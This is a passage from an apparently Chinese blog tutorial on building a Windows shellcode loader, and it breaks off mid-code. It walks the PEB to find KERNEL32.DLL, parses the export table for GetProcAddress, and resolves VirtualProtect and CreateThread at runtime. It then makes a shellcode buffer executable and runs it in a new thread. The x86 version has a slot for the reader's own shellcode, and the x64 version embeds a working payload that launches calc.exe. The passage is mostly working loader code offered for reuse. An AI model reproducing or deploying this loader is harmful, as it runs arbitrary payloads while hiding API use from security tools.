<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt _LDR_DATA_TABLE_ENTRY 0x0000020ce3606040</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090517766.png" data-fancybox="true"/></div></div>

<p>还不是<code>Kernel32.dll</code>,继续查<code>InLoadOrderLinks</code>：</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090642141.png" data-fancybox="true"/></div></div>

<p>到此，通过遍历<code>InLoadOrderLinks</code>链，我们找到了<code>KERNEL32.DLL</code>，取出基址就比较容易了，在<code>0x30</code>偏移处.取出这个基址，我们就可以解析PE导出表，找到我们需要的函数的地址了.</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明定义API函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* p_GetProcAddress)</span><span class="params">(HMODULE hModule, LPCSTR lpProcName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* p_LoadLibraryA)</span><span class="params">(LPCSTR lpLibFileName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* p_VirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* p_CreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* p_WaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内联汇编函数，用于获取Kernel32.dll模块的基地址</span></span><br><span class="line">HMODULE <span class="keyword">inline</span> __declspec(naked) <span class="built_in">GetKernel32Moudle</span>() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs:[<span class="number">0x30</span>]</span><br><span class="line">        mov eax, [eax + <span class="number">0x0C</span>]</span><br><span class="line">        mov eax, [eax + <span class="number">0x14</span>]</span><br><span class="line">        mov eax, [eax]</span><br><span class="line">        mov eax, [eax]</span><br><span class="line">        mov eax, [eax + <span class="number">0x10</span>]</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取GetProcAddress函数的地址</span></span><br><span class="line"><span class="function">DWORD <span class="title">pGetProcAddress</span><span class="params">(HMODULE Kernel32Base)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> szGetProcAddr[] = &#123; <span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    DWORD result = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历kernel32.dll的导出表，找到GetProcAddr函数地址</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)Kernel32Base;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)Kernel32Base + pDosHead-&gt;e_lfanew);</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp;pNtHead-&gt;OptionalHeader;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)Kernel32Base + pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    DWORD* pAddOfFun_Raw = (DWORD*)((DWORD_PTR)Kernel32Base + pExport-&gt;AddressOfFunctions);</span><br><span class="line">    WORD* pAddOfOrd_Raw = (WORD*)((DWORD_PTR)Kernel32Base + pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line">    DWORD* pAddOfNames_Raw = (DWORD*)((DWORD_PTR)Kernel32Base + pExport-&gt;AddressOfNames);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* pFinded = <span class="literal">NULL</span>, * pSrc = szGetProcAddr;</span><br><span class="line">    <span class="keyword">for</span> (DWORD dwCnt = <span class="number">0</span>; dwCnt &lt; pExport-&gt;NumberOfNames; dwCnt++) &#123;</span><br><span class="line">        pFinded = (<span class="type">char</span>*)((DWORD_PTR)Kernel32Base + pAddOfNames_Raw[dwCnt]);</span><br><span class="line">        <span class="keyword">while</span> (*pFinded &amp;&amp; *pFinded == *pSrc) &#123;</span><br><span class="line">            pFinded++; pSrc++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*pFinded == *pSrc) &#123;</span><br><span class="line">            result = (DWORD)((DWORD_PTR)Kernel32Base + pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pSrc = szGetProcAddr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用实际的shellcode替换此字符串</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;填写x86的shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hKernal32 = <span class="built_in">GetKernel32Moudle</span>(); <span class="comment">// 获取Kernel32模块的地址</span></span><br><span class="line">    p_GetProcAddress GetProcAddress = (p_GetProcAddress)<span class="built_in">pGetProcAddress</span>(hKernal32); <span class="comment">// 获取GetProcAddress函数的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取函数地址</span></span><br><span class="line">    p_VirtualProtect VirtualProtect = (p_VirtualProtect)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">    p_CreateThread CreateThread = (p_CreateThread)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">    p_WaitForSingleObject WaitForSingleObject = (p_WaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="X64"><a href="#X64" class="headerlink" title="X64"></a>X64</h4><h5 id="动态获取-GetProcAddress"><a href="#动态获取-GetProcAddress" class="headerlink" title="动态获取 GetProcAddress"></a>动态获取 GetProcAddress</h5><p>由于x64无法编写内联汇编代码, 因此需另创一个asm文件来进行编写 右键—&gt;添加—&gt;新建项—&gt;<code>GetInLoadOrderModuleList.asm</code></p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025104118275.png" data-fancybox="true"/></div></div>

<figure class="highlight c++"><figcaption><span>x64</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">	GetInLoadOrderModuleList PROC</span><br><span class="line">        mov rax, gs:[<span class="number">60</span>h]         ; 获取 PEB 的地址，PEB 在 TEB 中的偏移是 <span class="number">0x60</span></span><br><span class="line">        mov rax, [rax+<span class="number">18</span>h]        ; 获取 PEB_LDR_DATA 的地址，位于 PEB 的偏移 <span class="number">0x18</span></span><br><span class="line">        mov rax, [rax+<span class="number">10</span>h]        ; 获取 InLoadOrderModuleList 的地址，位于 PEB_LDR_DATA 的偏移 <span class="number">0x10</span></span><br><span class="line">        ret                       ; 返回调用者，结束过程</span><br><span class="line">    GetInLoadOrderModuleList ENDP</span><br><span class="line"></span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>鼠标右键单击<code>GetInLoadOrderModuleList.asm</code>—&gt;属性—&gt;从生成中排除设置为<code>否</code>—&gt;项类型设置为<code>定义生成工具</code></p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025104316538.png" data-fancybox="true"/></div></div>

<p>—&gt;自定义生成工具—&gt;命令行—&gt;<code>ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</code>—&gt;输出框—&gt;<code>$(IntDir)%(FileName).obj</code></p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025104507021.png" data-fancybox="true"/></div></div>

<p>打开项目属性—&gt;C&#x2F;C++—&gt;代码生成—&gt;禁用安全检查</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025104632272.png" data-fancybox="true"/></div></div>


<figure class="highlight c++"><figcaption><span>main.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">PVOID __stdcall <span class="title">GetInLoadOrderModuleList</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 声明一个外部的汇编函数，用于获取InLoadOrderModuleList链表的地址。</span></span><br><span class="line"><span class="comment">// extern &quot;C&quot; 保证该函数名在C++编译后不会被改变，以便与汇编代码正确链接。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">    USHORT Length;              <span class="comment">// 字符串的长度，以字节为单位。</span></span><br><span class="line">    USHORT MaximumLength;       <span class="comment">// 字符串的最大长度，以字节为单位。</span></span><br><span class="line">    PWSTR Buffer;               <span class="comment">// 指向实际字符串数据的指针。</span></span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"><span class="comment">// 定义UNICODE_STRING结构体，用于表示宽字符的字符串。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;            <span class="comment">// 链表指针，用于按加载顺序链接模块。</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;          <span class="comment">// 链表指针，用于按内存顺序链接模块。</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;  <span class="comment">// 链表指针，用于按初始化顺序链接模块。</span></span><br><span class="line">    PVOID DllBase;                          <span class="comment">// 模块的基地址。</span></span><br><span class="line">    PVOID EntryPoint;                       <span class="comment">// 模块的入口点地址。</span></span><br><span class="line">    ULONG SizeOfImage;                      <span class="comment">// 模块的大小，以字节为单位。</span></span><br><span class="line">    UNICODE_STRING FullDllName;             <span class="comment">// 包含模块完整路径的UNICODE_STRING结构体。</span></span><br><span class="line">    UNICODE_STRING BaseDllName;             <span class="comment">// 仅包含模块文件名的UNICODE_STRING结构体。</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"><span class="comment">// 定义LDR_DATA_TABLE_ENTRY结构体，用于表示加载模块的信息。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Kernel32.dll 的基地址</span></span><br><span class="line"><span class="function">HMODULE <span class="title">getKernel32Address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取InLoadOrderModuleList链表的头指针</span></span><br><span class="line">    PLIST_ENTRY moduleList = (PLIST_ENTRY)<span class="built_in">GetInLoadOrderModuleList</span>();</span><br><span class="line">    <span class="comment">// 获取链表中的第一个元素</span></span><br><span class="line">    PLIST_ENTRY current = moduleList-&gt;Flink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历整个链表，直到回到头指针</span></span><br><span class="line">    <span class="keyword">while</span> (current != moduleList) &#123;</span><br><span class="line">        <span class="comment">// 根据current指针获取包含它的LDR_DATA_TABLE_ENTRY结构体的基地址</span></span><br><span class="line">        LDR_DATA_TABLE_ENTRY* entry = <span class="built_in">CONTAINING_RECORD</span>(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line">        <span class="comment">// 获取模块的基本名称（不含路径）</span></span><br><span class="line">        <span class="type">const</span> <span class="type">wchar_t</span>* moduleName = entry-&gt;BaseDllName.Buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 比较模块名称是否为 &quot;KERNEL32.DLL&quot;（不区分大小写）</span></span><br><span class="line">        <span class="keyword">if</span> (_wcsicmp(moduleName, <span class="string">L&quot;KERNEL32.DLL&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果找到KERNEL32.DLL，返回其基地址</span></span><br><span class="line">            <span class="keyword">return</span> (HMODULE)entry-&gt;DllBase;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 移动到链表中的下一个元素</span></span><br><span class="line">        current = current-&gt;Flink;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果循环结束仍未找到KERNEL32.DLL，返回空指针</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GetProcAddress 函数的地址</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">getGetProcAddress</span><span class="params">(HMODULE hKernel32)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 将模块基地址转换为IMAGE_DOS_HEADER类型指针</span></span><br><span class="line">    PIMAGE_DOS_HEADER baseAddr = (PIMAGE_DOS_HEADER)hKernel32;</span><br><span class="line">    <span class="comment">// 根据DOS头结构中的偏移，获取PE头的地址</span></span><br><span class="line">    PIMAGE_NT_HEADERS pImageNt = (PIMAGE_NT_HEADERS)((LONG64)baseAddr + baseAddr-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 获取导出表的地址</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LONG64)baseAddr + pImageNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    <span class="comment">// 获取导出函数地址数组的地址</span></span><br><span class="line">    PULONG RVAFunctions = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfFunctions);</span><br><span class="line">    <span class="comment">// 获取导出函数名称数组的地址</span></span><br><span class="line">    PULONG RVANames = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfNames);</span><br><span class="line">    <span class="comment">// 获取导出函数序号数组的地址</span></span><br><span class="line">    PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)baseAddr + exportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line">    <span class="comment">// 遍历导出表中的所有函数名称</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        <span class="comment">// 根据序号获取函数的地址</span></span><br><span class="line">        LONG64 F_va_Tmp = (ULONG64)((LONG64)baseAddr + RVAFunctions[AddressOfNameOrdinals[i]]);</span><br><span class="line">        <span class="comment">// 获取函数名称</span></span><br><span class="line">        PUCHAR FunctionName = (PUCHAR)((LONG64)baseAddr + RVANames[i]);</span><br><span class="line">        <span class="comment">// 比较是否为 &quot;GetProcAddress&quot; 函数（区分大小写）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span>*)FunctionName, <span class="string">&quot;GetProcAddress&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 返回函数的地址</span></span><br><span class="line">            <span class="keyword">return</span> F_va_Tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果未找到 &quot;GetProcAddress&quot; 函数，返回0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义指向 GetProcAddress 函数的指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* pGetProcAddress)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="comment">// 定义指向 VirtualProtect 函数的指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="comment">// 定义指向 CreateThread 函数的指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="comment">// 定义指向 WaitForSingleObject 函数的指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取 Kernel32.dll 的基地址</span></span><br><span class="line">    HMODULE hKernel32 = <span class="built_in">getKernel32Address</span>();</span><br><span class="line">    <span class="comment">// 获取 GetProcAddress 函数地址</span></span><br><span class="line">    pGetProcAddress GetProcAddress = (pGetProcAddress)<span class="built_in">getGetProcAddress</span>(hKernel32);</span><br><span class="line">    <span class="comment">//// 示例：创建线程执行 shellcode</span></span><br><span class="line">    pCreateThread CreateThread = (pCreateThread)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">    pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line">    pVirtualProtect VirtualProtect = (pVirtualProtect)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">    <span class="comment">//修改shellcode缓冲区的内存保护属性，以便执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//创建新线程执行shellcode并等待其执行完成</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, 